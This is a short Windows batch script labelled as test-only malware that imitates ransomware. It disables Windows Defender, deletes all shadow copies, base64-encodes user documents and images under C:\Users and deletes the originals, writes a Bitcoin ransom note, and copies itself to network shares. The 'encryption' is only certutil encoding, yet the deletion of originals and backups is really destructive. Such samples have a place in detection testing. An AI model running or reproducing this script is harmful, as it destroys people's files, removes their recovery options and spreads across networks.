@echo off
REM Windows-style malware script (test only)

REM Disable Windows Defender
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"

REM Delete shadow copies
vssadmin delete shadows /all /quiet

REM Encrypt files
for /R C:\Users\ %%f in (*.doc *.docx *.pdf *.jpg *.png) do (
    certutil -encode "%%f" "%%f.encrypted"
    del "%%f"
)

REM Create ransom note
echo YOUR FILES ARE ENCRYPTED > C:\RANSOM.txt
echo PAY 500 USD IN BITCOIN >> C:\RANSOM.txt

REM Spread via network
net view | find "\\" > shares.txt
for /F %%s in (shares.txt) do (
    xcopy %0 %%s\share\ /Y
)

pause
